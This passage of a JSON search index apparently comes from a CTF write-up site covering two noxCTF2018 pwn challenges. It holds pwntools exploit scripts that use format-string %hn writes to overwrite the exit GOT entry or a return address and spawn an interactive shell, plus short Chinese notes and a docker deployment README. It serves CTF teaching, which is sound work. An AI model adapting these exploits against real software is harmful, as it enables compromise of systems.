\"./TheNameCalculator\" # code = context.binary = ELF(binary) # if args['LIBDEBUG']: # os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits) # if args['LIBC']: # os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC']) # libc = code.libc # libc.symbols['main_arena'] = libc.symbols['__malloc_hook'] + 0x10 # libc.symbols['one_gadget'] = 0xf1147 def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # io.recvuntil('sha256(xxxx+') # suffix = io.recvuntil(')', drop=True) # io.recvuntil('== ') # hash_str = io.recvline(keepends=False) # io.sendline(iters.bruteforce(lambda x: sha256sumhex( # x + suffix) == hash_str, string.printable[:62], 4, 'fixed')) else : io = process ( binary ) rand = 111458341 print io . recvline () payload1 = \"A\" * 0x1c + p32 ( rand ) gdb . attach ( io , ''' b *0x08048625 b *0x080486D5 b *0x080487C2 c ''' ) io . send ( payload1 ) io . recvline () the_exit = 0x0804A024 supersecret = 0x08048596 def encode ( payload ): xor_chr = 0x5F7B4153 if len ( payload ) % 4 != 0 : print \"Payload is not the multiple 4!\" exit ( 0 ) result = \"\" for i in range ( 0 , 24 , 1 ): res = \"\" orig = u32 ( payload [ i : i + 4 ]) res = p32 ( orig ^ xor_chr ) payload = payload [ 0 : i ] + res + payload [ i + 4 :] # print payload return payload # payload2_orig = (\"AAAA\" + \"%12$x.\"*3).ljust(28, \"\\x00\") payload2_orig = p32 ( 0x0804A024 ) + \" %34194c \" + \"%12$hn\" payload2_orig = payload2_orig . ljust ( 28 , \" \\x00 \" ) payload2 = encode ( payload2_orig ) io . send ( payload2 ) io . interactive ()","title":"The Name Calculator"},{"location":"noxCTF2018/pwn/TheNameCalculator/writeup/#_1","text":"\u53c8\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6700\u540e\u8986\u76d6\u4e86exit\u51fd\u6570\u7684got\u8868\u3002 \u4e2d\u95f4\u6709\u4e2axor\u7f16\u7801\u7684\u8fc7\u7a0b\uff0c\u9700\u8981\u5199\u4e2a\u5bf9\u5e94\u7684\u89e3\u7801\uff08\u4e0e\u7f16\u7801\u4e00\u6837\u6d41\u7a0b\uff09","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"noxCTF2018/pwn/TheNameCalculator/writeup/#_2","text":"#!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools # IP = \"chal.noxale.com\" # PORT = 5678 IP = \"127.0.0.1\" PORT = 9999 context . log_level = 'critical' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./TheNameCalculator\" # code = context.binary = ELF(binary) # if args['LIBDEBUG']: # os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits) # if args['LIBC']: # os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC']) # libc = code.libc # libc.symbols['main_arena'] = libc.symbols['__malloc_hook'] + 0x10 # libc.symbols['one_gadget'] = 0xf1147 def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # io.recvuntil('sha256(xxxx+') # suffix = io.recvuntil(')', drop=True) # io.recvuntil('== ') # hash_str = io.recvline(keepends=False) # io.sendline(iters.bruteforce(lambda x: sha256sumhex( # x + suffix) == hash_str, string.printable[:62], 4, 'fixed')) else : io = process ( binary ) rand = 111458341 print io . recvline () payload1 = \"A\" * 0x1c + p32 ( rand ) gdb . attach ( io , ''' b *0x08048625 b *0x080486D5 b *0x080487C2 c ''' ) io . send ( payload1 ) io . recvline () the_exit = 0x0804A024 supersecret = 0x08048596 def encode ( payload ): xor_chr = 0x5F7B4153 if len ( payload ) % 4 != 0 : print \"Payload is not the multiple 4!\" exit ( 0 ) result = \"\" for i in range ( 0 , 24 , 1 ): res = \"\" orig = u32 ( payload [ i : i + 4 ]) res = p32 ( orig ^ xor_chr ) payload = payload [ 0 : i ] + res + payload [ i + 4 :] # print payload return payload # payload2_orig = (\"AAAA\" + \"%12$x.\"*3).ljust(28, \"\\x00\") payload2_orig = p32 ( 0x0804A024 ) + \" %34194c \" + \"%12$hn\" payload2_orig = payload2_orig . ljust ( 28 , \" \\x00 \" ) payload2 = encode ( payload2_orig ) io . send ( payload2 ) io . interactive ()","title":"\u5229\u7528\u4ee3\u7801"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/","text":"ctf_xinetd \u00b6 A docker repository for deploying ctf problem configuration \u00b6 Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment. build \u00b6 docker build -t \"helloworld\" . run \u00b6 docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/#ctf_xinetd","text":"A docker repository for deploying ctf problem","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/#configuration","text":"Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment.","title":"configuration"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/#build","text":"docker build -t \"helloworld\" .","title":"build"},{"location":"noxCTF2018/pwn/TheNameCalculator/docker_env/#run","text":"docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"run"},{"location":"noxCTF2018/pwn/believeMe/writeup/","text":"\u5206\u6790 \u00b6 \u672a\u5f00\u542fASLR\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 \u5229\u7528\u4ee3\u7801 \u00b6 #!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools IP = \"18.223.228.52\" PORT = 13337 context . log_level = 'critical' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./believeMe\" code = context . binary = ELF ( binary ) if args [ 'LIBDEBUG' ]: os . environ [ 'LD_LIBRARY_PATH' ] = '/dbg{}/lib' . format ( code . bits ) if args [ 'LIBC' ]: os . environ [ 'LD_PRELOAD' ] = os . path . abspath ( args [ 'LIBC' ]) libc = code . libc libc . symbols [ 'main_arena' ] = libc . symbols [ '__malloc_hook' ] + 0x10 libc . symbols [ 'one_gadget' ] = 0xf1147 def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # io.recvuntil('sha256(xxxx+') # suffix = io.recvuntil(')', drop=True) # io.recvuntil('== ') # hash_str = io.recvline(keepends=False) # io.sendline(iters.bruteforce(lambda x: sha256sumhex( # x + suffix) == hash_str, string.printable[:62], 4, 'fixed')) else : io = process ( \"./believeMe\" ) nox = 0x0804867B # \u539fret address\u4f4d\u4e8e0xffffdd1c\u3000\u4e3alibc_start_main\u4e2d\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5b9e\u9645\u8c03\u8bd5\u53d1\u73b0\uff0c\u91cd\u65b0\u8ba1\u7b97\u4e86esp\uff0c\u5e94\u8be5\u4e3a0xffffdd2c stack = 0xffffdd2c payload = p32 ( 0xffffdd2e ) + p32 ( 0xffffdd2c ) + \\ \" %2044c \" + \"%9$hn\" + \" %32375c \" + \"%10$hn\" # payload = \"%x.\" * 15 # payload = p32(0xffffdd26) + p32(0xffffdd24) + \\ # \".%7$x.\" + \"%22$x.\" + \"%23$x.\" + \"%24$x.\" print payload print io . recvrepeat ( timeout = 0.5 ) gdb . attach ( io , ''' b *0x080487D3 c ''' ) io . sendline ( payload ) io . interactive ()","title":"believe Me"},{"location":"noxCTF2018/pwn/believeMe/writeup/#_1","text":"\u672a\u5f00\u542fASLR\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002","title":"\u5206\u6790"},{"location":"noxCTF2018/pwn/believeMe/writeup/#_2","text":"#!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools IP = \"18.223.228.52\" PORT = 13337 context . log_level = 'critical' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./believeMe\" code = context . binary = ELF ( binary ) if args [ 'LIBDEBUG' ]: os . environ [ 'LD_LIBRARY_PATH' ] = '/dbg{}/lib' . format ( code . bits ) if args [ 'LIBC' ]: os . environ [ 'LD_PRELOAD' ] = os . path . abspath ( args [ 'LIBC' ]) libc = code . libc libc . symbols [ 'main_arena' ] = libc . symbols [ '__malloc_hook' ] + 0x10 libc . symbols [ 'one_gadget' ] = 0xf1147 def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # io.recvuntil('sha256(xxxx+') # suffix = io.recvuntil(')', drop=True) # io.recvuntil('== ') # hash_str = io.recvline(keepends=False) # io.sendline(iters.bruteforce(lambda x: sha256sumhex( # x + suffix) == hash_str, string.printable[:62], 4, 'fixed')) else : io = process ( \"./believeMe\" ) nox = 0x0804867B # \u539fret address\u4f4d\u4e8e0xffffdd1c\u3000\u4e3alibc_start_main\u4e2d\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5b9e\u9645\u8c03\u8bd5\u53d1\u73b0\uff0c\u91cd\u65b0\u8ba1\u7b97\u4e86esp\uff0c\u5e94\u8be5\u4e3a0xffffdd2c stack = 0xffffdd2c payload = p32 ( 0xffffdd2e ) + p32 ( 0xffffdd2c ) + \\ \" %2044c \" + \"%9$hn\" + \" %32375c \" + \"%10$hn\" # payload = \"%x.\" * 15 # payload = p32(0xffffdd26) + p32(0xffffdd24) + \\ # \".%7$x.\" + \"%22$x.\" + \"%23$x.\" + \"%24$x.\" print payload print io . recvrepeat ( timeout = 0.5 ) gdb . attach ( io , ''' b *0x080487D3 c ''' ) io . sendline ( payload ) io . interactive ()","title":"\u5229\u7528\u4ee3\u7801"},{"location":"noxCTF2018/pwn/believeMe/docker_env/","text":"ctf_xinetd \u00b6 A docker repository for deploying ctf problem configuration \u00b6 Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment. build \u00b6 docker build -t \"helloworld\" . run \u00b6 docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/believeMe/docker_env/#ctf_xinetd","text":"A docker repository for deploying ctf problem","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/believeMe/docker_env/#configuration","text":"Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment.","title":"configuration"},{"location":"noxCTF2018/pwn/believeMe/docker_env/#build","text":"docker build -t \"helloworld\" .","title":"build"},{"location":"noxCTF2018/pwn/believeMe/docker_env/#run","text":"docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"run"}]}